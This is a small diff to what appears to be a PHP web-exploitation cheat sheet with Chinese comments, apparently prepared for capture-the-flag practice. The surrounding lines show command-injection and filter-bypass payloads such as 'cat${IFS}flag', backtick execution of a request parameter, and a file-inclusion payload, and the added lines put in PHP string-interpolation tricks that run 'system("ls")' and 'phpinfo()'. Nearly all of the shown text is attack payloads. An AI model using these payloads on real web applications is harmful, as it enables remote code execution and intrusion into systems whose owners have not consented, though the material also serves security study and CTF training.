@@ -59,6 +59,10 @@ cat${IFS}flag
 // ``就像exec不會直接顯示結果，需要echo
 echo `$_GET[1]`;&1=ls
 
+echo "{${phpinfo()}}";
+echo "{${system("ls")}}";
+die("...");
+
 
 // 文件包含漏洞
 include$_GET[1];             // 中間空格可以省略
